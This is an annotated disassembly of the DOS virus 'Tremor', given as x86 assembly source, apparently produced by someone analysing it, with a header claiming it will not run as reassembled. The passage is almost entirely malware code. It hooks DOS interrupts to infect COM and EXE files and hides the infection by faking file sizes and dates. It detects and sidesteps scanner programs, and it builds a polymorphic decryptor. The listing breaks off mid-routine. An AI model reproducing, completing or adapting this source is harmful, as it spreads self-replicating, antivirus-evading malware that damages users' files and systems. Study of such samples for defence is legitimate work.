;--------------------------------------------------------------------------
;--
;--             TREMOR
;--
;-- you can reassemble it, but the cod will not run.
;-- i have had no time to make it work (and there is no need for)
;-- but you will see, how tremor works.
;--
;--------------------------------------------------------------------------
paras_needed    equ     10ch

old__ds         equ     offset old__si-23
old__es         equ     offset old__si-17
old__ax         equ     offset old__si-12
old__bx         equ     offset old__si-9
old__cx         equ     offset old__si-6
old__dx         equ     offset old__si-3
old__di         equ     offset old__si+3
old__bp         equ     offset old__si+6

dtastruc        struc
                reserv  db      15h dup (?)
                attr    db      ?
                time    dw      ?
                date    dw      ?
                fsize   dd      ?
                fname   db      13 dup (?)
ends

;--------------------------------------------------------------------------
code_seg        segment
                assume  cs:code_seg
;-------------------------------------------------------------------
                org     0               ; !!
flag            db      ?
                db      85h dup (?)
;-------------------------------------------------------------------
internal_21     dd      ?
                dd      ?
tremor_24       dd      ?
tremor_21       dd      ?

orig21          dd      ?
internal_15     dd      ?
tremor_15       dd      ?
tempdta:
       xres     db      15h dup (?)
       xattr    db      ?
       xtime    dw      ?
       xdate    dw      ?
       xsize    dd      ?
       xfname   db      13 dup (?)
;------------------------------------------------------------
extra           dw      ?               ;
;-------------------------------------------------------------------
start:          mov     di,offset frstbyte+100h ; psp segment !!
                and     ax,ax
init_bx         equ     $+1
                mov     bx,0
                mov     cx,891h
                push    ds
                pop     es
locloop_3:      xor     [di],bx
                sti
                add     bx,0
                sub     di,-2
                loop    locloop_3
                nop
frstbyte:       jmp     virinstall
                db      0ebh,0bh
                nop
                nop
                nop
                jmp     virinstall
;-------------------------------------------------------------------
virint21done:   call    getorigregs
loc_5:          jmp     toold21

virint21:       cmp     byte ptr cs:[BP_Flag],1   ; "disabled"
                je      loc_5

                mov     word ptr cs:[offset old__si],si
                mov     si,offset old__si
                mov     cs:[si+(offset old__ds-offset old__si)],ds
                push    cs
                pop     ds
                mov     ds:[si+(old__ax)],ax
                mov     ds:[si+(old__bx)],bx
                mov     ds:[si+(old__cx)],cx
                mov     ds:[si+(old__dx)],dx
                mov     ds:[si+(old__di)],di
                mov     ds:[si+(old__bp)],bp
                mov     ds:[si+(old__es)],es

                cmp     byte ptr ds:[si+(offset flickerflag-offset old__si)],1
psycholabel:    jmp     loc_8

                add     al,ah
                and     al,0fh
                add     ah,al
                and     ah,0fh
                push    ax
                mov     dx,3dah
                in      al,dx
                pop     bx
                mov     al,8
                mov     ah,bl
                mov     dl,0d4h
                out     dx,ax
                mov     dl,0c0h
                mov     al,33h
                out     dx,al
                mov     al,bh
                out     dx,al
                call    getorigregs
                push    ax
                xor     cx,cx
                mov     al,0b6h
                out     43h,al
                mov     cl,ah
                shl     al,1
                shl     cx,1
                in      al,61h
                push    ax
                or      al,3
                out     61h,al

locloop_7:      loop    locloop_7

                pop     ax
                out     61h,al
                pop     ax

loc_8:          cmp     ah,57h          ; get/set filestamp
                je      handlefkts
                cmp     ah,42h          ; seek in file
                je      handlefkts

                cmp     ah,3fh          ; read file
                db      74h             ; JZ
disablhndchk    db      offset chkflhandl-offset $+2
                cmp     ah,50h          ; set psp
                jb      loc_9

                cmp     ah,6ch          ; ext. create
                jb      loc_13
loc_9:          cmp     ah,30h          ; get dos-version....
                jne     loc_11          ; normally 1st call of each prog !

chkflhandl:     cmp     bl,4            ; diskfile ?
                ja      handlefkts

loc_11:         cmp     ah,3ch          ; create/overwrite file
                ja      loc_12
                cmp     ah,12h          ; findnext /fcb
                ja      loc_13
loc_12:         cmp     ah,0eh          ; set curr. disk
                ja      handlefkts

loc_13:         jmp     virint21done

;-------------------------------------------------------------
;               file-handle operations
;-------------------------------------------------------------
handlefkts:     xor     bx,bx
                call    checkforvsafe
                mov     byte ptr cs:[org4ad],cl
                mov     al,0
                call    set_com_flag

                mov     al,15h                  ; get int 15h
                mov     di,offset tremor_15
                call    getint
                mov     di,offset internal_15   ; set int 15h
                call    setint

                mov     al,21h                  ; get int 21h
                mov     di,offset tremor_21
                call    getint
                mov     di,offset internal_21   ; set int 21h
                call    setint

                mov     al,24h                  ; get int 24h
                mov     di,offset tremor_24
                call    getint

                mov     dx,posint24

                push    cs                      ; set int 24h
                pop     ds
                call    setint1

                call    getorigregs
;-------------------------------------------------------------------
;               read file via handle
;-------------------------------------------------------------------
                cmp     ah,3fh
                je      fktreadhndl
                jmp     loc_24

fktreadhndl:    jcxz    loc_16          ; "nothing to do"
                ;
                mov     ax,5700h        ; get filestamp (infected..)
                call    performint21
                jc      loc_16          ; error ->... bye
                cmp     dh,0c7h         ; dh > c7 -> infected
                ja      loc_17
loc_16:         jmp     chain

loc_17:         call    readfirstbytes
                jc      loc_16
                call    checkifinfected
                jnz     loc_16
                ;
                call    trem_popall
                mov     bx,word ptr cs:[filesize  ]
                mov     dx,word ptr cs:[filesize+2]
                call    chkfilesize
                ja      loc_18

                add     bx,cx
                adc     dx,0
                call    chkfilesize
                jbe     loc_19

                sub     bx,word ptr cs:[data_x01]
                sub     bx,cx
                neg     bx
                push    bx
                jmp     loc_20

loc_18:         xor     cx,cx
loc_19:         push    cx
loc_20:         call    getorigregs
                pop     cx
                call    performint21
                jc      loc_23

                pushf
                push    ax
                push    si
                push    di
                push    ds
                push    es
                push    ds
                pop     es

                push    cs
                pop     ds

                mov     di,word ptr ds:filesize
                cmp     word ptr ds:[di+3],0    ; check hi-word of filesize
                ja      loc_22                  ; > 64kb -> bye

                cmp     word ptr [di],18h       ; check lo-word of filesize
                jae     loc_22                  ; > 24 byte -> jmp

                mov     ax,[di]                 ; ( error ?!?)
                mov     di,dx
                mov     si,ax
                add     si,offset buffer
                cmp     cx,18h
                jb      loc_21
                sub     ax,18h
                neg     ax
                xchg    ax,cx
loc_21:         cld
                rep     movsb
loc_22:         pop     es
                pop     ds
                pop     di
                pop     si
                pop     ax
                popf
loc_23:         jmp     loc_27
;-------------------------------------------------------------------
;               seek to end of file / handle
;-------------------------------------------------------------------
loc_24:         cmp     ax,4202h
                jne     loc_28

                mov     ax,5700h        ; get timestamp
                call    performint21
                jnc     loc_26
chain:          jmp     chaintoint21

loc_26:         cmp     dh,200         ; dh < 0c8 -> not infected
                jb      chain
                call    readfirstbytes
                jc      chain
                call    checkifinfected
                jnz     chain
                call    trem_popall
                pushf
                sub     dx,4000         ; seek to "real" end of file...
                sbb     cx,0            ; cx:dx ist position from eof
                popf
                call    performint21
loc_27:         mov     cx,word ptr cs:[old__cx] ;
                jmp     back
;-------------------------------------------------------------------
;               get/set memblock
;-------------------------------------------------------------------
loc_28:         db      0ebh
enablegetmem    db      offset loc_31-offset $+2  ; jmp short loc_31

                cmp     ah,4ah          ; set mem-block
                je      loc_29
                cmp     ah,48h          ; get mem
                jne     loc_31

loc_29:         call    trem_popall
                call    performint21
                jnc     back            ;
                cmp     al,8            ; "out of memory" !
                jne     back            ;
                sub     bx,paras_needed ; amount of possible memory
                stc                     ; to request...
back:           jmp     backtocaller
;------------------------------------------------------------------
;               findfirst / findnext via handle
;------------------------------------------------------------------
loc_31:         db      0ebh
enablehandle    db      0

                cmp     ah,4eh
                jb      loc_37
                cmp     ah,4fh
                ja      loc_37

                call    performint21            ; do it and check result..
                pushf
                push    ax
                jc      goback

                call    getdta                          ; -> dta=es:bx ,
                                                        ; al = c8
                cmp     byte ptr es:[bx.date+1],al      ;
                jb      goback                          ; not infected
                sub     byte ptr es:[bx.date+1],al      ; else "des"-infect

                mov     si,1ah                          ; now : check size

loc_32:         cmp     byte ptr es:[bx+si+2],0         ; low-byte of high-word
                jne     loc_33                          ; always strip off
                                                        ; virussize between
                                                        ; 64kb and 1mb ?!?

                cmp     word ptr es:[bx+si  ],8192      ; minsize to infect
                jb      goback

loc_33:         sub     word ptr es:[bx+si  ],4000      ; vir-size..
                sbb     word ptr es:[bx+si+2],0

goback:         call    trem_popall
                pop     ax
loc_35:         popf

backtocaller:   retf    2               ; end of int 21h.......
;-------------------------------------------------------------------
;       findfirst / findnext / fcb
;-------------------------------------------------------------------
loc_37:         cmp     ah,11h
                jb      xcreate
                cmp     ah,12h
                ja      xcreate

                call    performint21
                pushf
                push    ax
                cmp     al,0ffh                 ; error
                je      goback

                call    getdta                  ; al=c8
                cmp     byte ptr es:[bx],0ffh   ; extended fcb..
                jne     loc_38
                add     bx,7
loc_38:         cmp     byte ptr es:[bx+1ah],al ; f-attribut.....
                jb      goback
                sub     byte ptr es:[bx+1ah],al ; stealth it
                mov     si,1dh
                jmp     loc_32
;-------------------------------------------------------------------
;               extended open / create / replace
;-------------------------------------------------------------------
xcreate:        cmp     ah,6ch
                jne     chkifopen
                mov     dx,si
                jmp     hopenfile
;-------------------------------------------------------------------
;               open file / get handle
;-------------------------------------------------------------------
chkifopen:      cmp     ah,3dh
                jne     chkifclose

hopenfile:      inc     word ptr cs:[random_1]
                cmp     al,2            ; open r/w ?
                jne     chkifclose

des_infect_it:  call    clean__file     ; ! interesting
                jmp     loc_50
;-------------------------------------------------------------------
;               close file / release handle
;-------------------------------------------------------------------
chkifclose:     cmp     ah,3eh
                jne     checkiftimestamp

                call    performint21    ; perform close file
                pushf
                push    ax              ; result
                jc      readfhdone      ; error -> nothing else to do

                call    getflag_cs_00   ; get flag
                cmp     bl,al           ; bl was filehandle
                jne     readfhdone

                call    setflag_cs_00   ; al to flagpos
                push    cs
                pop     ds
                mov     dx,2
                call    do_infect
readfhdone:     jmp     goback
;-------------------------------------------------------------------
;               get/set files datetime
;-------------------------------------------------------------------
checkiftimestamp:
                cmp     ah,57h
                jne     call_checkfortremor

                cmp     al,1            ; set timestamp
                je      issettime

                call    trem_popall     ; get timestamp........
                call    performint21
                pushf
                jc      return2caller
                cmp     dh,200
                jb      return2caller
                sub     dh,200
return2caller:  jmp     loc_35

issettime:      cmp     dh,200
                jb      isnot2000
                sub     byte ptr cs:[old__dx],200
isnot2000:      call    readfirstbytes
                jc      loc_50
                call    seekbeginoffile
                call    infect_file
                jc      loc_50
                call    sub_17
                call    trem_popall
                add     dh,200
                call    performint21
                pushf
                sub     dh,200
                jmp     return2caller

call_checkfortremor:
                call    checkfortremor
;-------------------------------------------------------------------
;               programm-ende
;-------------------------------------------------------------------
                cmp     ah,4ch
                jne     loc_51
                ;
        mov     cs:[offset enablehandle],0
        mov     cs:[offset disablhndchk],offset chkflhandl-offset disablhndchk+1
                ;
loc_50:         jmp     loc_55
;-------------------------------------------------------------------
;               exec
;-------------------------------------------------------------------
loc_51:         cmp     ah,4bh
                je      loc_52
                jmp     loc_60

loc_52:         call    setflag_cs_00   ; al->cs:00
                cmp     al,0            ; exec or load ovl ?
                je      loc_53          ; = 0 -> exec
                jmp     des_infect_it

loc_53:         db      0ebh
watchfiles      db      0

                mov     dx,-paras_needed     ; 10ch
                call    GetTremMem; setzt 29dh auf 0

                push    cs
                pop     ds

                mov     ds:[watchfiles  ],offset loc_0053-offset loc_53+2
                mov     ds:[enablegetmem],offset loc_31-offset loc_28+2
                mov     ds:[enablehandle],0
                ;
loc_0053:       call    getorigregs

                call    findfile                ;
                jc      loc_55

                cmp     byte ptr cs:[tempdta],3 ; drive c: ?
                jb      loc_55                  ; no, floppy

                mov     ax,word ptr cs:[tempdta.fname]
                cmp     ax,4248h                ; "HB"scan
                je      loc_54
                cmp     ax,4c43h                ; "CL"ean
                je      loc_54
                cmp     ax,4353h                ; "SC"an
                jne     loc_56

loc_54:         call    getorigregs
                call    clean__file             ; !!
                call    setflag_cs_00           ; flag = -1
loc_55:         jmp     chaintoint21

loc_56:         push    cs
                pop     es
                mov     di,offset specialfiles
                mov     cx,8                    ; 8 filenames
                cld
                repne   scasw
                jnz     loc_58

                cmp     ax,4843h                           ; "CH"
                jne     loc_57
                cmp     word ptr cs:[tempdta.fname+2],444bh; "KD"
                jne     loc_57                  ;------------------------
                                                ; else : chkdsk running !
                                                ;------------------------

        mov     byte ptr cs:[enablehandle],offset xcreate-offset loc_31+2

loc_57:         call    getrealmemorysize
                mov     byte ptr cs:[watchfiles],0
loc_58:         cmp     word ptr cs:[tempdta.fname+1],4a52h; "RJ"
                jne     loc_59

  mov     byte ptr cs:[disablhndchk],offset handlefkts-offset disablhndchk+1


loc_59:         call    getorigregs
                jmp     loc_61
;-------------------------------------------------------------------
;               get / set file-attribut
;-------------------------------------------------------------------
loc_60:         cmp     ah,43h
                jne     chaintoint21    ;
                or      al,al           ; is it "get"
                jnz     loc_62          ; no -> jmp
                ;
                cmp     bx,0faceh       ; is it tremor who calls ?
                jne     chaintoint21    ; no -> jmp
                ;---------------------------------------------------
loc_61:         call    checkif_com_file; zf = com-file
                jnz     loc_62
                mov     al,1
                call    set_com_flag

loc_62:         call    getorigregs
                call    do_infect

chaintoint21:   call    trem_popall

                cmp     word ptr cs:[offset my_call],ax
                jne     toold21
org_487         equ     $+2
                mov     ax,word ptr cs:[random_1]
                iret

toold21:        jmp     dword ptr cs:[internal_21]
;--------------------------------------------------------------------------
;               virus-s :
;--------------------------------------------------------------------------
;               get int in al to dword cs:di
;--------------------------------------------------------------------------
getint:         mov     ah,35h
                call    performint21
                mov     cs:[di],bx
                mov     word ptr cs:[di+2],es
                retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
resetints:      mov     al,15h          ; set int 15h to cs:tremor_15
                mov     di,offset tremor_15
                call    setint
                mov     al,21h          ; set int 21h to cs:tremor_21
                mov     di,offset tremor_21
                call    setint
org4ad          equ     $+1
                mov     bl,81h
                call    checkforvsafe
                mov     al,24h          ; set int 24h
                mov     di,offset tremor_24

setint:         mov     dx,cs:[di]
                mov     bx,word ptr cs:[di+2]
                mov     ds,bx

setint1:        mov     ah,25h          ;

performint21:   pushf
                call    dword ptr cs:[internal_21]
                retn
;--------------------------------------------------------------------------
getdta:         mov     ax,2fc8h                ; set dta
                jmp     performint21
;--------------------------------------------------------------------------
getsetfattr:    mov     ah,43h                  ;
                jmp     performint21
;--------------------------------------------------------------------------
getsetfilesdatetime:
                mov     ah,57h                  ; get/set filestamp
                jmp     sethandlecall21
;--------------------------------------------------------------------------
read_first_32byte:
                mov     cx,-1
                mov     dx,-32          ; cx:dx = -32
                mov     al,2
                call    seek            ; seek from eof

read_32:        mov     ah,3fh
                mov     cx,20h          ; read last 32 byte
setbuff:        mov     dx,offset buffer; filename/buffer

tempfhandle equ     $+1

sethandlecall21:mov     bx,5
                jmp     performint21
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
writeexeheader: mov     cx,18h
truncate:       mov     ah,40h          ; write to file
                jmp     setbuff
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
opendestfile:   mov     bp,dx
                mov     al,0
                call    getsetfattr             ; get attr
                jc      loc_ret_72
                mov     word ptr cs:[origfattr],cx
                test    cl,3                    ; r/o or hidden ?
                jz      loc_71                  ; no, jmp
                mov     al,1
                xor     cx,cx                   ; set attr to "none"
                call    getsetfattr             ; set attr
                jc      loc_ret_72

loc_71:         mov     ax,3d92h                ; open file
                call    performint21
                jc      loc_ret_72

                mov     word ptr cs:[tempfhandle],ax
                mov     al,0                    ; get
                call    getsetfilesdatetime
                mov     word ptr cs:[origfdate],dx
                mov     word ptr cs:[origftime],cx
loc_ret_72:     retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
readfirstbytes: mov     word ptr cs:[tempfhandle],bx
read32byte:     mov     al,1
                call    seekinfile      ; seek from current position
                jc      loc_74
                push    ax
                push    dx
                push    ds

                push    cs
                pop     ds

                mov     word ptr ds:[filesize  ],ax   ;
                mov     word ptr ds:[filesize+2],dx

                call    read_first_32byte       ; buffer = ds:104dh
                pop     ds
                pop     cx
                pop     dx
                jc      loc_73
                cmp     ax,20h                  ; read 32 byte ok ?
                jne     loc_73

seekstartoffile:mov     al,0                    ; ok. seek begin of file !
                jmp     seek                    ; and return !

loc_73:         call    seekstartoffile         ; and 2*return
loc_74:         stc
                retn

sub_17:         mov     al,0

filesize        equ     $+1
                mov     dx,0                    ; dummy-code to save
                mov     cx,0                    ; data (filesize).
seekbeginoffile:
                xor     ax,ax
seekinfile:     xor     cx,cx
                mov     dx,cx
seek:           mov     ah,42h                  ; seek
                jmp     sethandlecall21
;--------------------------------------------------------------------------
setinfectdate:  mov     al,1                    ; set files date-time
origfdate       equ     $+1
                mov     dx,0deafh
origftime       equ     $+1
                mov     cx,2800h
                call    getsetfilesdatetime
                mov     ah,3eh                  ; close file
                call    sethandlecall21

                call    getorigregs
origfattr       equ     $+1
                mov     cx,20h
                mov     al,1
                jmp     getsetfattr
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
checkif_com_file:
                mov     di,dx
                mov     cx,80
                mov     al,'.'          ; serach for "."
                push    ds
                pop     es
                cld
                repne   scasb
                jnz     loc_ret_78
                mov     ax,[di]
                or      ax,6060h        ; 4f43h or 6060h => 6f63h
                cmp     ax,6f63h        ; 4f43h = "co"
loc_ret_78:     retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
do_infect:      call    checkforfprot
                jz      loc_82
                call    opendestfile
                jnc     loc_79                  ; no error -> jmp
                cmp     al,3                    ; error = file not found ?
                ja      loc_80                  ; yes -> return
                retn

loc_79:         call    readheader
                jnc     loc_80
                call    add200toyear
                call    infect_file

loc_80:         jmp     setinfectdate

dontinfect:     sub     byte ptr cs:[1+origfdate],200
loc_82:         stc
                retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
infect_file:    call    checkifinfected
                jz      loc_82
                push    cs
                pop     ds
                call    read_32
                jc      dontinfect

                mov     si,offset buffer
                call    test_com_flag
                jnz     loc_83

                cmp     byte ptr [si],0e9h      ; long jmp
                je      loc_84
                mov     al,0
                call    set_com_flag

loc_83:         cmp     word ptr [si],5a4dh     ; 'MZ'
                jne     dontinfect
                cmp     word ptr ds:[si+18h],40h; start of reloc-table
                je      dontinfect              ; 40h => *.dll !
                                                ; it doesnt try to infect
                                                ; windows and os/2-software

loc_84:         mov     ax,ds:[si+10h]          ; sp-init
                cmp     ax,2f0h                 ;
                je      dontinfect

                cmp     ax,510h
                jb      loc_85

                cmp     ax,522h
                jb      dontinfect

loc_85:         call    test_com_flag
                jnz     loc_86                  ; ??!
loc_86:         mov     word ptr ds:[init_sp],ax

                mov     ax,ds:[si+14h]          ; get init-ip
                call    test_com_flag
                jnz     loc_87
                mov     ax,ds:[si+1]
                mov     word ptr ds:[init_jump],ax
                mov     ax,100h
loc_87:         mov     word ptr ds:[init_ip],ax
                call    test_com_flag
                jz      loc_88

                mov     ax,word ptr ds:[si+4]   ; nr of 512-pages
                cmp     ax,10h
                jb      dontinfect
                dec     ax
                mov     dx,512
                mul     dx
                add     ax,word ptr ds:[si+2]   ; add rest of file
                adc     dx,0
                push    ax              ; files size (without overlays !!)
                push    dx

loc_88:         mov     al,2
                call    seekinfile      ; seek from eof

                mov     ds:[si+18h],ax  ; low filesize   -> reloc-entry
                mov     ds:[si+1ah],dx  ; high filesize

                call    test_com_flag
                jnz     loc_90

                or      dx,dx           ; file > 64kb  (its a com-file !)
                jnz     skip_file
                cmp     ah,0d6h         ; file > 54784 byte
                ja      skip_file
                cmp     ah,20h
                jb      skip_file       ; file < 8192 byte
                mov     di,ax
                sub     di,3
                jmp     loc_91

skip_file:      jmp     dontinfect

loc_90:         pop     bp              ; file-size
                pop     di
                cmp     ax,di
                jne     skip_file
                cmp     dx,bp
                jne     skip_file
                cmp     dx,0fh          ; > 968kb !
                ja      skip_file

                mov     di,ax
                and     di,0fh          ; filesize mod 15
loc_91:         mov     word ptr ds:[org_895],di
                push    di
                mov     cl,4
                shr     ax,cl
                ror     dx,cl
                add     ax,dx
                sub     ax,ds:[si+8]
                push    ax
                push    ax
                push    ax
                add     ax,di
                push    ax
                mov     ah,2ah                  ; get system-date
                call    performint21

                add     dh,3
                cmp     dh,0dh
                jb      loc_92
                sub     dh,0ch
                inc     cx

loc_92:         mov     word ptr ds:[org_ceeh],cx
                mov     word ptr ds:[org_ce8h],dx
                mov     ah,2ch
                call    performint21           ; get system-time
                pop     ax
                add     ax,cx
                add     ax,dx
                neg     ax
                mov     word ptr ds:[si+1ch],0deadh     ;-)
                mov     word ptr ds:[si+1eh],ax
                xor     ax,0deafh
                mov     word ptr ds:[org_7e6],ax
                mov     word ptr ds:data_0109,ax

                call    sub_29

                mov     word ptr ds:[org_8ee],ax
                mov     word ptr ds:[org_8df],bx
                pop     ax
                sub     ax,bx
                sub     ax,ds:[si+16h]
                mov     word ptr ds:[init_cs],ax
                pop     ax
                sub     ax,bx
                sub     ax,word ptr ds:[si+0eh]
                mov     word ptr ds:[init_ss],ax
                shl     bx,1
                mov     word ptr ds:[org_883],bx
                cld

                push    si
                push    cs
                pop     es
                ;---------------------------------------------------
                ;       codemachine starts
                ;---------------------------------------------------
                mov     si,offset data_x01
                mov     di,si
                push    si
                lodsw                   ; data_x01:data_x02 -> bx:ax
                xchg    ax,bx
                lodsw
                xchg    al,ah           ; bx:ax=bhblahal -> bhblalah
                xchg    bl,bh           ;                   blbhalah
                xchg    ah,bl           ;                   ahbhalbl
                xchg    ax,bx           ;                   bhahblal
                stosw                   ;data_x01:data_x02 <- ax:bx
                xchg    ax,bx
                stosw
                ;---------------------------------------------------
                mov     ah,2ch          ;  get sys-time
                call    performint21
                mov     bp,cx
                add     bp,dx
                mov     bx,cx
                mov     cl,4
                shl     bl,cl
                and     dh,0fh
                or      dh,bl
                mov     dl,bh
                shl     dl,cl
                push    dx
                mov     ah,2ah          ; get sys-date
                call    performint21
                add     bp,dx
                neg     bp
                mov     cx,dx
                pop     dx
                or      dl,al
                mov     di,offset extra
                mov     ax,bp
                call    sub_29
                mov     word ptr ds:[org_8f5],ax
                mov     word ptr ds:[org_8a5],ax
                mov     word ptr ds:[org_8e6],bx
                mov     bx,word ptr ds:[random_1]
                pop     si
                ;-----------------------------------( code-generator)---
                test    dl,1
                jz      loc_94
                mov     al,26h          ; es:
                test    ch,2            ;            cx !=10.0000b = es:
                jz      loc_93
                mov     al,6            ; push es
                stosb
                mov     al,1fh          ; pop ds
loc_93:         stosb

loc_94:         lodsb
                call    sub_30
                lodsb
                call    sub_30
                lodsb
                call    sub_30
                lodsb
                call    sub_30

                test    dl,1
                jnz     loc_97
                test    bl,15h
                jnz     loc_95
                mov     ax,71eh
                stosw
                jmp     loc_97

loc_95:         mov     al,0f2h         ; repnz
                test    ch,1
                jz      loc_96
                inc     ax              ; repz
loc_96:         stosb
loc_97:         push    di
                sub     si,4
                call    test_com_flag
                jz      loc_98
                mov     al,36h          ; ss:
                stosb
loc_98:         mov     al,31h
                mov     byte ptr ds:data_103,al   ; xor [di],al
                test    dh,40h
                jz      loc_99
                mov     byte ptr ds:data_103,1    ; add [di],ax
                mov     al,29h
loc_99:         mov     byte ptr ds:[org_1081],al ; sub [di],al
                stosb
                mov     al,1ch                  ; sbb reg8bit,abs
                test    dh,2
                jz      loc_100
                inc     al                      ; sbb reg16bit,abs
loc_100:        test    cl,3
                jz      loc_101
                sub     al,8                    ; adc reg16bit,abs
loc_101:        stosb
                call    sub_32
                test    bl,1
                jz      loc_102
                call    insertnearjmp

loc_102:        mov     byte ptr ds:data_0108,5 ; add ax,xxxx
                cmp     ch,0ah
                jb      loc_103
                test    cl,3
                jnz     loc_103
                mov     ax,5f8dh
                stosw
                xor     ax,ax
                mov     al,bl
                or      al,40h
                cbw
                mov     word ptr ds:data_0109,ax         ; add ax,xxxx
                stosb
                jmp     loc_106

loc_103:        mov     al,81h
                stosb
                mov     al,0c3h
                test    cl,3
                jz      loc_104
                dec     ax
loc_104:        test    dl,2
                jz      loc_105
                add     al,30h
                mov     byte ptr ds:data_0108,35h
loc_105:        stosb

org_7e6         equ  $+1
                mov     ax,0f6f5h
                stosw
loc_106:        test    bl,1
                jnz     loc_107
                call    insertnearjmp
loc_107:        test    dh,3
                jz      loc_109
                call    sub_32

                mov     al,83h          ; sub si,-11
                stosb
                mov     al,0eeh
                test    dh,2            ; dh, bit 2 ="1" -> di
                jz      loc_108
                inc     ax              ; sub di,-11
loc_108:        stosb
                mov     al,0feh
                stosb
                jmp     loc_111

loc_109:        mov     al,46h                  ; inc si
                test    dh,2
                jz      loc_110
                inc     ax                      ; inc di
loc_110:        stosb
                push    ax
                call    sub_32
                pop     ax
                stosb
loc_111:        call    sub_32
                test    bl,3
                jnz     loc_112
                test    dl,10h
                jnz     loc_112
                cmp     ch,3
                ja      loc_112
                mov     al,0e2h
                jmp     loc_116

loc_112:        mov     al,49h          ; dec cx
                test    dl,10h          ;               dl!=1000b = use cx
                jz      loc_113         ;               dl =1000b = use bp
                add     al,4            ; dec bp
loc_113:        test    bl,3
                jz      loc_114
                sub     al,8            ; inc bp / inc cx
loc_114:        stosb
                call    sub_32
                cmp     ch,0ah
                jb      loc_115
                test    cl,3
                jz      loc_117
loc_115:        test    dh,3
                jnz     loc_117
                test    dl,2
                jz      loc_117
                mov     al,77h
loc_116:        jmp     loc_118

loc_117:        mov     al,75h
loc_118:        stosb
                pop     ax
                dec     ax
                sub     ax,di
                stosb
                test    di,1
                jnz     loc_120
                mov     al,bl
                and     al,7
                or      al,90h
                cmp     al,94h
                jne     loc_119
                inc     ax
loc_119:        stosb
loc_120:        mov     ax,0edh
                sub     ax,di
                shr     ax,1
                add     ax,7b0h
                mov     ds:data_x02,ax
org_883         equ     $+1
                add     ax,0deh
                test    bl,3
                jz      loc_121
                neg     ax
org_88d         equ     $+1
loc_121:        mov     word ptr ds:[init_bx],ax
                mov     ax,di
                mov     ds:data_x01,ax
org_895         equ     $+1
                add     ax,0c36ch
                sub     ax,offset extra
                call    test_com_flag
                jnz     loc_122
                add     ax,103h
                jmp     loc_123

org_8a5         equ     $+1
loc_122:        add     ax,4f0h
org_8a8         equ     $+1
loc_123:        mov     word ptr ds:[extra+1],ax

                mov     al,0e9h
                stosb
len_of_jmp      equ     $+1
                mov     ax,0cd5h
                sub     ax,di
                stosw
                pop     si
                call    scramblebuffer

                mov     al,2
                call    seekinfile
                call    sub_58
                jnc     loc_125

loc_124:        pop     ax
                pop     ax
                jmp     dontinfect

loc_125:        cmp     ax,cx
                jne     loc_124
                call    seekbeginoffile
                call    scramblebuffer
                call    test_com_flag
                jnz     buildexeheader
                pop     ax
                pop     ax
                mov     ds:[si+1],ax
                jmp     loc_127


buildexeheader: pop     ax
                push    ax
org_8df         equ     $+1
                sub     ax,006fh
                mov     ds:[si+16h],ax  ;  cs_init
                pop     ax
org_8e6         equ     $+1
                sub     ax,004fh
                mov     ds:[si+0eh],ax  ; ss_init
                pop     ax
                push    ax
org_8ee         equ     $+1
                add     ax,06f0h
                mov     ds:[si+14h],ax  ; ip_init

                pop     ax
org_8f5         equ     $+1
                add     ax,04f0h        ; = 1264 dec
                ;
                add     ax,1080h        ; = 4224 dec, sum=5488 dec
                mov     ds:[si+10h],ax  ; sp_init

                mov     ax,word ptr ds:[si+2]   ; get lastbytes
                add     ax,4000
                cwd                             ; = xor dx,dx
                mov     bx,200h
                div     bx
                add     word ptr ds:[si+4],ax   ; nr of pages
                mov     word ptr ds:[si+2],dx   ; lastbytes
loc_127:        jmp     writeexeheader
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
readheader:     call    read32byte
chkdate200:     mov     al,byte ptr cs:[origfdate+1]
                mov     ah,200
                cmp     al,ah
                retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
add200toyear:   add     al,ah
                mov     byte ptr cs:[origfdate+1],al
                retn
;--------------------------------------------------------------------------
test_com_flag:  cmp     byte ptr cs:[com_flag],1
                retn
;--------------------------------------------------------------------------
set_com_flag:   mov     byte ptr cs:[com_flag],al
                retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
sub_29:         mov     cl,4            ; ax = 1234h -> ax=0230h
                and     ax,0ff0h        ;               bx=0023h
                mov     bx,ax           ;               cl=4
                shr     bx,cl
                retn
;--------------------------------------------------------------------------
;               code-generator
;
;       oh god !
;       why does somebody, that can write such a machine, waste his time
;       writing the virus around ?? i'll never understand it.
;
;--------------------------------------------------------------------------
sub_30          proc    near
                push    ax
                mov     ah,bl
                and     ah,3
                cmp     al,ah
                jne     loc_130
                test    dl,1
                jz      loc_128
                mov     al,85h          ; test
                jmp     loc_129

loc_128:        mov     al,23h
                test    cl,2
                jz      loc_129
                mov     al,0bh          ; or

loc_129:        mov     ah,0c0h
                stosb
                mov     al,bl
                and     al,7
                add     al,ah
                stosb
loc_130:        pop     ax
                cmp     al,3
                je      loc_ret_139
                cmp     al,2
                je      loc_136
                cmp     al,1
                je      loc_133
                call    test_com_flag
                jz      loc_131
                cmp     bl,6
                ja      loc_131
                mov     al,8dh
                stosb
                mov     al,1eh
                test    cl,3
                jz      loc_132
                mov     al,16h
                jmp     loc_132
loc_131:        mov     al,0bbh
                test    cl,3
                jz      loc_132
                dec     ax
loc_132:        stosb
                mov     ax,bp
                mov     word ptr ds:init_ip,ax
                stosw
                retn

loc_133:        call    test_com_flag
                jz      loc_134

                cmp     bl,0fch
                jb      loc_134

                mov     al,8dh          ; 8d 36 -> lea si,offset
                stosb
                mov     al,36h
                test    dh,2
                jz      loc_135
                mov     al,3eh          ; 8d 3e -> lea di,offset
                jmp     loc_135

loc_134:        mov     al,0beh         ; 8d be -> lea di,[bp+...]
                test    dh,2
                jz      loc_135
                inc     ax              ; 8d bf -> lea di,[bx+...]
loc_135:        stosb
                mov     word ptr ds:[org_8a8],di
                stosw
                retn

loc_136:        call    test_com_flag
                jz      loc_137
                test    bh,5
                jz      loc_137
                mov     al,8dh          ; 8d 0e -> lea,cx,[xxxx]
                stosb
                mov     al,0eh          ;
                test    dl,10h
                jz      loc_138
                mov     al,2eh          ; 8d 2e -> lea bp,[xxxx]
                jmp     loc_138

loc_137:        mov     al,0b9h         ; mov al,"mov cx,xxxx"
                test    dl,10h
